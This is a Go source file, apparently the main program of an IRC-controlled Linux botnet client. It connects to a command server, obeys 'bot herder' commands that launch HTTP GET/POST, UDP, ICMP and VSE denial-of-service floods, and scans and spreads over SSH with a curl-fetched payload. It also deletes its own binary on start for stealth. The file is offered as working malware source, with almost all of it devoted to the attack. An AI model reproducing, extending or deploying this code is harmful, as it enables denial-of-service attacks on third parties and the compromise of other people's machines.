package main

import (
	"bufio"
	"fmt"
	"net/textproto"
	"os"
	"runtime"

	"bot/pkg"
)

////////////////////////////////////////////////////////////////////////////
//                         START CONFIG HERE!!!                          //
//////////////////////////////////////////////////////////////////////////

const (
	IRC_Server        = "" //config IRC server and port here. //xxx.xxx.xxx.xxx:xxx //127.0.0.1:6667
	IRC_Backup_Server = "" //config like main server.
	IRC_Channel       = "" //config channel here. //"#Example"
	IRC_Chan_Password = "" //config channel password here. //If you didn't have, Just leave it blank.
	New_Payload_Name  = "" //config new payload name. //For curl process.
)

//////////////////////////////////////////////////////////////////////////
//                         STOP CONFIG HERE!!!                         //
////////////////////////////////////////////////////////////////////////

func bot(server string) error {
	irc := pkg.IRC_Conn(server)
	tp := textproto.NewReader(bufio.NewReader(irc))
	pkg.IRC_Login(irc, IRC_Channel, IRC_Chan_Password)

	for {
		ircRead, err := tp.ReadLine()
		if err != nil {
			return err
		}

		//Server interact
		go func() {
			if pkg.IRC_Find(ircRead, "PING :") {
				pkg.IRC_Send(irc, "PONG "+pkg.IRC_Recv(ircRead, 1))
			}
		}()

		//Check is user modes and Join IRC channel
		if pkg.IRC_Find(ircRead, "+iwx") || pkg.IRC_Find(ircRead, "+i") ||
			pkg.IRC_Find(ircRead, "+w") || pkg.IRC_Find(ircRead, "+x") {
			pkg.IRC_Send(irc, fmt.Sprint("JOIN "+IRC_Channel+IRC_Chan_Password))
		}

		//Check bot herder commands
		go func() {
			switch {
			case pkg.IRC_Find(ircRead, "?get"):
				pkg.DDoS_Switch = false
				pkg.IRC_Report(irc, IRC_Channel, "START HTTP GET FLOOD TO: "+
					pkg.IRC_Recv(ircRead, 4))
				pkg.GET(pkg.IRC_Recv(ircRead, 4), IRC_Channel, irc)
			case pkg.IRC_Find(ircRead, "?post"):
				pkg.DDoS_Switch = false
				pkg.IRC_Report(irc, IRC_Channel, "START HTTP POST FLOOD TO: "+
					pkg.IRC_Recv(ircRead, 4))
				pkg.POST(pkg.IRC_Recv(ircRead, 4), IRC_Channel, irc)
			case pkg.IRC_Find(ircRead, "?udp"):
				pkg.DDoS_Switch = false
				pkg.IRC_Report(irc, IRC_Channel, "START UDP FLOOD TO: "+
					pkg.IRC_Recv(ircRead, 4))
				pkg.DUDP(pkg.IRC_Recv(ircRead, 4), pkg.IRC_Recv(ircRead, 5), IRC_Channel, irc)
			case pkg.IRC_Find(ircRead, "?icmp"):
				pkg.DDoS_Switch = false
				pkg.IRC_Report(irc, IRC_Channel, "START ICMP FLOOD TO: "+
					pkg.IRC_Recv(ircRead, 4))
				pkg.ICMP(pkg.IRC_Recv(ircRead, 4), IRC_Channel, irc)
			case pkg.IRC_Find(ircRead, "?vse"):
				pkg.DDoS_Switch = false
				pkg.IRC_Report(irc, IRC_Channel, "START VSE FLOOD TO: "+
					pkg.IRC_Recv(ircRead, 4))
				pkg.VSE(pkg.IRC_Recv(ircRead, 4), IRC_Channel, irc)
			case pkg.IRC_Find(ircRead, "?scan"):
				pkg.IRC_Report(irc, IRC_Channel, "START SCANNING.")
				pkg.SSH_Conn(irc, pkg.IRC_Recv(ircRead, 4), IRC_Channel, New_Payload_Name)
			case pkg.IRC_Find(ircRead, "?info"):
				pkg.ReportInf(irc, IRC_Channel)
			case pkg.IRC_Find(ircRead, "?kill"):
				os.Exit(0)
			case pkg.IRC_Find(ircRead, "?stopddos"):
				pkg.DDoS_Switch = true
				pkg.IRC_Report(irc, IRC_Channel, "STOP ATTACKING.")
			case pkg.IRC_Find(ircRead, "?stopscan"):
				pkg.Scan_Switch = true
				pkg.IRC_Report(irc, IRC_Channel, "STOP SCANNING.")
			}
		}()
	}
}

func main() {
	os.Remove(os.Args[0])
	if runtime.GOOS != "linux" {
		os.Exit(0)
	}

	if bot(IRC_Server) != nil {
		for {
			if bot(IRC_Backup_Server) != nil {
				continue
			} else {
				break
			}
		}
	}
}
